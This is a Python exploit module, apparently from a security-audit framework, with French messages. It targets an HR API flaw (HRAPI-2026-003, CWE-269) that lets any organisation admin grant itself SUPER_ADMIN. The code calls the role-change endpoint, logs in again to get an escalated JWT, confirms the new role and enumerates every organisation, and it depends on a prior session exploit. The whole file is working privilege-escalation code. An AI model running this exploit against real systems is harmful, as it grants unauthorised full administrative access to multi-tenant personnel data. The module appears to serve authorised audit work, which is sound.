"""HRAPI-2026-003 — élévation de privilèges vers SUPER_ADMIN."""

from __future__ import annotations
from .base import Module, Option, Context


class Exploit(Module):
    id = "HRAPI-2026-003"
    name = "roles/privilege_escalation_super_admin"
    cwe = "CWE-269"
    cvss = "9.9 (Critique)"
    description = (
        "La route PUT /roles/users/:id/system-role n'exige que role:manage "
        "(tout ORGANIZATION_ADMIN) et accepte SUPER_ADMIN, sans contrôle "
        "d'organisation. Nécessite une session (lancer d'abord HRAPI-2026-001)."
    )
    options = {
        "role": Option(default="SUPER_ADMIN", help="rôle système à s'attribuer"),
        "email": Option(help="e-mail (pour re-login après escalade)"),
        "newpass": Option(default="Pwned-by-audit-123!", help="mot de passe courant du compte"),
    }

    def run(self, ctx: Context) -> bool:
        access = ctx.store.get("ACCESS")
        user_id = ctx.store.get("USER_ID")
        if not access or not user_id:
            ctx.fail("Pas de session. Lance d'abord 'use HRAPI-2026-001' puis 'run'.")
            return False

        role = self.opt(ctx.store, "role")
        ctx.client.set_system_role(access, user_id, role)
        ctx.info(f"Rôle {role} demandé pour l'utilisateur {user_id}.")

        # Le rôle est porté par le JWT (HRAPI-2026-009) : il faut un nouveau jeton.
        email = self.opt(ctx.store, "email") or ctx.store.get("EMAIL")
        newpass = self.opt(ctx.store, "newpass") or ctx.store.get("SESSION_PASS")
        if not email:
            ctx.info(f"Rôle demandé ({role}). Re-login nécessaire : définis 'set email ...'.")
            return True

        session = ctx.client.login(email, newpass)
        access = session.get("tokens", {}).get("accessToken")
        new_role = session.get("user", {}).get("systemRole")
        ctx.store["ACCESS"] = access
        ctx.store["SESSION_ROLE"] = new_role

        if new_role == role:
            ctx.ok(f"Escalade confirmée : le compte est désormais {new_role}.")
            orgs = ctx.client.list_organizations(access)
            if orgs:
                ctx.ok(f"Endpoint SUPER_ADMIN accessible : {len(orgs)} organisation(s).")
                ctx.store["ORGS"] = orgs
                for o in orgs:
                    ctx.line(f"      - {o.get('name')}  (id={o.get('id')})")
            return True

        ctx.fail(f"Escalade non confirmée (role={new_role}).")
        return False
